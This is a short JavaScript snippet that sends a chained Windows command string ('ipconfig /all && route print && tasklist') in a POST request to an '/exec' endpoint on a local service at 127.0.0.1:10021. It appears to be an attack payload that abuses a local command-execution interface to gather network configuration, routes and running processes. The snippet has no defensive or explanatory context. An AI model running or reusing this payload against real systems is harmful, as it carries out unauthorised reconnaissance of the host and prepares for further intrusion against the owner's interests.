const note="ipconfig /all && route print && tasklist";
fetch("http://127.0.0.1:10021/exec", {method:"POST",body:JSON.stringify({message:note})});
